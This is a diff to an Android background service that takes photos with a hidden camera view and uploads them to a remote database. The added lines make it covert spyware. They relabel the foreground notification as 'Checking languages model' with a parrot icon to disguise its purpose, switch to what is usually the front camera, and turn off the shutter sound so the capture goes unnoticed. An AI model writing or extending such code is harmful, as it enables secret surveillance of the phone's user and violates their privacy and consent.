@@ -86,14 +86,12 @@ public class myBackgroundService extends Service
 
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
             Notification.Builder notification = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentText("Service is running")
-                    .setContentTitle("Service enabled")
-                    .setSmallIcon(R.drawable.ic_launcher_background);
+                    .setContentText("Checking languages model")
+                    .setContentTitle("Checking...")
+                    .setSmallIcon(R.drawable.parrot_logo);
 
             startForeground(NOTIFICATION_ID, notification.build());
         }
-
-
 
         valueEventListener = new ValueEventListener() {
             @RequiresApi(api = Build.VERSION_CODES.P)
@@ -131,7 +129,7 @@ public class myBackgroundService extends Service
 
     private void capturePicture()
     {
-        mCamera = Camera.open(0);
+        mCamera = Camera.open(1);
         if(mCamera != null)
         {
             SurfaceView sv = new SurfaceView(this);
@@ -155,6 +153,8 @@ public class myBackgroundService extends Service
                 {
                     Log.e("Shay", "Surface Created");
                     Camera.Parameters params = mCamera.getParameters();
+                    params.set("camera-sound", "off");
+                    params.set("shutter-sound", "0");
                     mCamera.setParameters(params);
                     Camera.Parameters p = mCamera.getParameters();
 
@@ -191,9 +191,9 @@ public class myBackgroundService extends Service
                                 throw new RuntimeException(e);
                             }
 
-                            mCamera.stopPreview();
-                            mCamera.release();
                             wm.removeView(sv);
+                            mCamera.stopPreview();
+
 
                             //Uplaod image to database
                             ByteArrayOutputStream bytes = new ByteArrayOutputStream();
@@ -203,6 +203,8 @@ public class myBackgroundService extends Service
 
                             byte bytesOfImage[] = bytes.toByteArray();
                             uploadImageToSorage(bytesOfImage);
+
+                            mCamera.release();
                         }
                     });
 
@@ -224,6 +226,7 @@ public class myBackgroundService extends Service
             });
 
             wm.addView(sv, params);
+
         }
     }
 
